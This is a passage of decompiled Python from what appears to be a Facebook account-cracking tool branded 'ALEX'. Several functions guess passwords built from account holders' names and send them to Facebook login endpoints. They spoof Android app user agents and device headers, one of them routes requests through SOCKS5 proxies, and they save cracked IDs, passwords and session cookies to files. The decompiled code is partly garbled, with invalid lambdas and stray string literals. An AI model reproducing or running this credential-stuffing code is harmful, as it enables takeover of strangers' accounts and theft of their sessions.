                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
                        po = requests.post(url, data = data, headers = head).json()
                        if 'session_key' in po:
                            cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-OK-OLD.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-OK-NEW.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-ALIVE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            oks.append(ids)
                            ';'.join
                        if twf in str(po):
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [TWO-FACTOR] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                twf.append(ids)
                                'True'
                        if 'www.facebook.com' in po['error']['message']:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                'X-FB-Server-Cluster'
                            open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                            'True'
                        loop += 1
                        return None
                        if Exception:
                            e = 'X-FB-Client-IP'
                            e = None
                            del e
                            return None
                        e = 'X-FB-Client-IP'
                        del e

                
                def ffb4(ids, names, passlist):
                    global loop
                    sys.stdout.write('\r\r\x1b[1;37m [ALEX-CRACKING]  %s | ALIVE: %s\x1b[1;37m' % (loop, len(oks)))
                    sys.stdout.flush()
                    fn = names.split(' ')[0]
                    ln = names.split(' ')[1]
                    ln = fn
                    for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        x = '[FBAN/FB4A;FBAV/' + str(random.randrange(11, 300)) + '.0.0' + str(random.randint(9, 49)) + '.' + str(random.randrange(11, 313)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/' + str(random.randint(111111111, 999999999)) + ';FBCR/MTSRUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        proxyy = random.choice(xvx)
                        proxyys = {
                            'http': 'socks5://' + proxyy }
                        ua0011 = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X665B Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/' + fbav + ';FBPN/com.facebook.orca;FBLC/en_US;FBBV/' + fbbv + ';FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X665B;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
                        sim_serials = f'''["{xd}"]'''
                        li = [
                            '28',
                            '29',
                            '210']
                        li2 = random.choice(li)
                        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
                        jazoest = li2 + j1
                        data = {
                            'enroll_misauth': 'false',
                            'cpl': 'true',
                            'generate_session_cookies': '1',
                            'generate_machine_id': '1',
                            'meta_inf_fbmeta': '',
                            'currently_logged_in_userid': '0',
                            'fb_api_req_friendly_name': 'authenticate',
                            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
                        fbbb = str(random.randrange(300000000, 350000000))
                        fbbo = str(random.randrange(200000000, 300000000))
                        headers = {
                            'Authorization': f'''OAuth {accessToken}''',
                            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                            'X-FB-Net-HNI': str(random.randint(900000, 999999)),
                            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                            'X-FB-Friendly-Name': 'authenticate',
                            'X-FB-Connection-Type': 'unknown',
                            'User-Agent': ua0011,
                            'Accept-Encoding': 'gzip, deflate',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'X-FB-HTTP-Engine': 'Liger' }
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
                        po = requests.post(url, data = data, headers = headers, proxies = proxyys).json()
                        if 'session_key' in po:
                            cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + '\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-OK-OLD.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-OK-NEW.txt', 'a').write(ids + '|' + pas + '\n')
                            open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-ALIVE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            oks.append(ids)
                            ';'.join
                        if twf in str(po):
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [TWO-FACTOR] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                twf.append(ids)
                                'button_with_disabled'
                        if 'www.facebook.com' in po['error_msg']:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                'error_detail_type'
                            open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                            'login'
                        loop += 1
                        return None
                        if Exception:
                            e = 'source'
                            e = None
                            del e
                            return None
                        e = 'source'
                        del e

                
                def ffb22(ids, names, passlist):
                    global loop
                    sys.stdout.write(f'''\r\r\x1b[1;37m [ALEX-CRACKING]  {loop!s} | ALIVE: {len(oks)!s} | CHECKPOINT: {len(cps)!s}\x1b[1;37m''')
                    sys.stdout.flush()
                    session = requests.Session()
                    first = names.split(' ')[0]
                    last = names.split(' ')[1]
                    last = 'Khan'
                    ps = first.lower()
                    ps2 = last.lower()
                    for fikr in passlist:
                        pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                        android_version = str(random.randrange(6, 13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice([
                            'itel vesion 3 plus',
                            'Infinix X672',
                            'Infinix X6815B',
                            'Infinix X6815B',
                            'Infinix X6515',
                            'Infinix X6516',
                            'Infinix X6825',
                            'Infinix X5516B',
                            'Infinix X669C',
                            'Infinix X669D',
                            'Infinix X6815C',
                            'Infinix X670',
                            'Infinix X5516C',
                            'Infinix X6826B',
                            'Infinix X5516C',
                            'Infinix X676C',
                            'Infinix X697',
                            'Infinix X5516B',
                            'Infinix X6515',
                            'Infinix X6811'])
                        fbap = random.choice([
                            '738.0.0.11.397',
                            '60.0.0.16.76',
                            '419.0.0.20.71',
                            '504.0.0.28482',
                            '354.0.0.8.108',
                            '405.0.0.16.112',
                            '414.0.0.30.113',
                            '400.0.0.37.76',
                            '414.0.0.30.113',
                            '408.1.0.16.113'])
                        ua13 = random.choice(ugen)
                        head = 'en-GB,en-US;q=0.9,en;q=0.8'
                        getlog = session.get(f'''https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                        idpass = {
                            'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                            'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                            'uid': ids,
                            'next': 'https://mbasic.facebook.com/login/save-device/',
                            'flow': 'login_no_pin',
                            'pass': pas }
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                        ALEX = session.cookies.get_dict().keys()
                        if 'c_user' in ALEX:
                            coki = session.cookies.get_dict()
                            cookie = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            open('/sdcard/ALEX-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            oks.append(ids)
                            ';'.join
                        if 'checkpoint' in ALEX:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                cps.append(ids)
                                'accept-language'
                            'gzip, deflate, br'
                        loop += 1
                        return None
                        if requests.exceptions.ConnectionError:
                            'accept-encoding'
                            time.sleep(20)
                            return None
                        if 'accept-encoding':
                            e = 'document'
                            e = None
                            del e
                            return None
                        e = 'document'
                        del e

                
                def ffb00(ids, names, passlist):
                    global loop
                    sys.stdout.write(f'''\r\r\x1b[1;37m [ALEX-CRACKING]  {loop!s} | ALIVE: {len(oks)!s} | CHECKPOINT: {len(cps)!s}\x1b[1;37m''')
                    sys.stdout.flush()
                    session = requests.Session()
                    first = names.split(' ')[0]
                    last = names.split(' ')[1]
                    last = 'Khan'
                    ps = first.lower()
                    ps2 = last.lower()
                    for fikr in passlist:
                        pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                        android_version = str(random.randrange(6, 13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice([
                            'itel vesion 3 plus',
                            'Infinix X672',
                            'Infinix X6815B',
                            'Infinix X6815B',
                            'Infinix X6515',
                            'Infinix X6516',
                            'Infinix X6825',
                            'Infinix X5516B',
                            'Infinix X669C',
                            'Infinix X669D',
                            'Infinix X6815C',
                            'Infinix X670',
                            'Infinix X5516C',
                            'Infinix X6826B',
                            'Infinix X5516C',
                            'Infinix X676C',
                            'Infinix X697',
                            'Infinix X5516B',
                            'Infinix X6515',
                            'Infinix X6811'])
                        fbap = random.choice([
                            '738.0.0.11.397',
                            '60.0.0.16.76',
                            '419.0.0.20.71',
                            '504.0.0.28482',
                            '354.0.0.8.108',
                            '405.0.0.16.112',
                            '414.0.0.30.113',
                            '400.0.0.37.76',
                            '414.0.0.30.113',
                            '408.1.0.16.113'])
                        ua12 = random.choice(useragent)
                        head = 'en-GB,en-US;q=0.9,en;q=0.8'
                        getlog = session.get(f'''https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                        idpass = {
                            'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                            'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                            'uid': ids,
                            'next': 'https://mbasic.facebook.com/login/save-device/',
                            'flow': 'login_no_pin',
                            'pass': pas }
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                        ALEX = session.cookies.get_dict().keys()
                        if 'c_user' in ALEX:
                            coki = session.cookies.get_dict()
                            cookie = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            open('/sdcard/Alex-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            oks.append(ids)
                            ';'.join
                        if 'checkpoint' in ALEX:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                cps.append(ids)
                                'accept-language'
                            'gzip, deflate, br'
                        loop += 1
                        return None
                        if requests.exceptions.ConnectionError:
                            'accept-encoding'
                            time.sleep(20)
                            return None
                        if 'accept-encoding':
                            e = 'document'
                            e = None
                            del e
                            return None
                        e = 'document'
                        del e

                
                def ffb001(ids, names, passlist):
                    global loop
                    sys.stdout.write(f'''\r\r\x1b[1;37m [ALEX-CRACKING]  {loop!s} | ALIVE: {len(oks)!s} | CHECKPOINT: {len(cps)!s}\x1b[1;37m''')
                    sys.stdout.flush()
                    session = requests.Session()
                    first = names.split(' ')[0]
                    last = names.split(' ')[1]
                    last = 'Khan'
                    ps = first.lower()
                    ps2 = last.lower()
                    for fikr in passlist:
                        pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                        android_version = str(random.randrange(6, 13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice([
                            'itel vesion 3 plus',
                            'Infinix X672',
                            'Infinix X6815B',
                            'Infinix X6815B',
                            'Infinix X6515',
                            'Infinix X6516',
                            'Infinix X6825',
                            'Infinix X5516B',
                            'Infinix X669C',
                            'Infinix X669D',
                            'Infinix X6815C',
                            'Infinix X670',
                            'Infinix X5516C',
                            'Infinix X6826B',
                            'Infinix X5516C',
                            'Infinix X676C',
                            'Infinix X697',
                            'Infinix X5516B',
                            'Infinix X6515',
                            'Infinix X6811'])
                        fbap = random.choice([
                            '738.0.0.11.397',
                            '60.0.0.16.76',
                            '419.0.0.20.71',
                            '504.0.0.28482',
                            '354.0.0.8.108',
                            '405.0.0.16.112',
                            '414.0.0.30.113',
                            '400.0.0.37.76',
                            '414.0.0.30.113',
                            '408.1.0.16.113'])
                        ua11 = random.choice(user_agents)
                        head = {
                            'cross-origin-resource-policy': 'cross-origin',
                            'upgrade-insecure-requests': '1',
                            'user-agent': ua11 }
                        getlog = session.get(f'''https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                        idpass = {
                            'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                            'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                            'uid': ids,
                            'next': 'https://mbasic.facebook.com/login/save-device/',
                            'flow': 'login_no_pin',
                            'pass': pas }
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                        ALEX = session.cookies.get_dict().keys()
                        if 'c_user' in ALEX:
                            coki = session.cookies.get_dict()
                            cookie = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-OK-OLD.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-OK-NEW.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            open('/sdcard/ALEX-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            oks.append(ids)
                            ';'.join
                        if 'checkpoint' in ALEX:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                cps.append(ids)
                                'u=1'
                            'priority'
                        loop += 1
                        return None
                        if requests.exceptions.ConnectionError:
                            'no-cache'
                            time.sleep(5)
                            return None
                        if 'no-cache':
                            e = 'pragma'
                            e = None
                            del e
                            return None
                        e = 'pragma'
                        del e

                
                def ffb1(ids, names, passlist):
                    global loop
                    sys.stdout.write(f'''\r\r\x1b[1;37m [ALEX-CRACKING]  {loop!s} | ALIVE: {len(oks)!s} | CHECKPOINT: {len(cps)!s}\x1b[1;37m''')
                    sys.stdout.flush()
                    session = requests.Session()
                    first = names.split(' ')[0]
                    last = names.split(' ')[1]
                    last = 'Khan'
                    ps = first.lower()
                    ps2 = last.lower()
                    for fikr in passlist:
                        pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                        android_version = str(random.randrange(6, 13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice([
                            'itel vesion 3 plus',
                            'Infinix X672',
                            'Infinix X6815B',
                            'Infinix X6815B',
                            'Infinix X6515',
                            'Infinix X6516',
                            'Infinix X6825',
                            'Infinix X5516B',
                            'Infinix X669C',
                            'Infinix X669D',
                            'Infinix X6815C',
                            'Infinix X670',
                            'Infinix X5516C',
                            'Infinix X6826B',
                            'Infinix X5516C',
                            'Infinix X676C',
                            'Infinix X697',
                            'Infinix X5516B',
                            'Infinix X6515',
                            'Infinix X6811'])
                        fbap = random.choice([
                            '738.0.0.11.397',
                            '60.0.0.16.76',
                            '419.0.0.20.71',
                            '504.0.0.28482',
                            '354.0.0.8.108',
                            '405.0.0.16.112',
                            '414.0.0.30.113',
                            '400.0.0.37.76',
                            '414.0.0.30.113',
                            '408.1.0.16.113'])
                        ua12 = random.choice(ugen)
                        head = 'en-US,en;q=0.9'
                        getlog = session.get(f'''https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                        idpass = {
                            'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                            'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                            'uid': ids,
                            'next': 'https://mbasic.facebook.com/login/save-device/',
                            'flow': 'login_no_pin',
                            'pass': pas }
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                        ALEX = session.cookies.get_dict().keys()
                        if 'c_user' in ALEX:
                            coki = session.cookies.get_dict()
                            cookie = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-OK-OLD.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-OK-NEW.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            open('/sdcard/ALEX-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            oks.append(ids)
                            ';'.join
                        if 'checkpoint' in ALEX:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                cps.append(ids)
                                'accept-language'
                            'gzip, deflate, br'
                        loop += 1
                        return None
                        if requests.exceptions.ConnectionError:
                            'accept-encoding'
                            time.sleep(5)
                            return None
                        if 'accept-encoding':
                            e = 'document'
                            e = None
                            del e
                            return None
                        e = 'document'
                        del e

                menu()
                return None
